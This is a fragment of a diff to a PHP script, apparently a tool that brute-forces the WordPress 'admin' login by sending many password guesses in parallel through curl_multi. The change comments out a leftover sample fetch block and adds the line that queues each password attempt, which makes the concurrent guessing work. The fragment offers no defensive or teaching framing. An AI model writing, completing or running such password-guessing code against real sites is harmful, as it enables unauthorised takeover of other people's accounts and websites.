@@ -11,7 +11,7 @@ function queueUp($array_of_passwords) {
     $username = 'admin';
     $redirect = './wp-admin/';
 
-
+/*
     foreach ($ids as $i => $id) {
         // URL from which data will be fetched
         $fetchURL = 'https://webkul.com&customerId='.$id;
@@ -21,6 +21,7 @@ function queueUp($array_of_passwords) {
         curl_setopt($multiCurl[$i], CURLOPT_RETURNTRANSFER,1);
         curl_multi_add_handle($mh, $multiCurl[$i]);
       }
+      */
 
 
       foreach($array_of_passwords as $i=>$password){
@@ -53,6 +54,8 @@ function queueUp($array_of_passwords) {
           echo "\n";
           $multiCurl[$i] = curl_init();
           curl_setopt_array( $multiCurl[$i], $options);
+          curl_multi_add_handle($mh, $multiCurl[$i]);
+
 
       }
 /*
